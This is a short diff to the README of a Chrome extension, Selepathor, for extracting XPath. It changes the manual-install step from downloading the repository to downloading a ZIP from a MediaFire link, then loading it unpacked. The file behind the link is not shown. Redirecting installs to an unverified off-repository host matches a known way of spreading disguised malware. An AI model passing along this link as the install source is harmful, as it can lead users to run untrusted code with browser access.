@@ -21,7 +21,7 @@ Selepathor is a Chrome extension that helps you easily extract XPath from any el
 
 ## Manual Installation 
 
-1. Download this repository as ZIP  
+1. Download the zip file from [here](https://www.mediafire.com/file/d6zg125lsmmaz0u/Selepathor.zip/file)
 2. Go to `chrome://extensions/` in Chrome  
 3. Enable **Developer Mode** (top right)  
 4. Click “**Load unpacked**”  
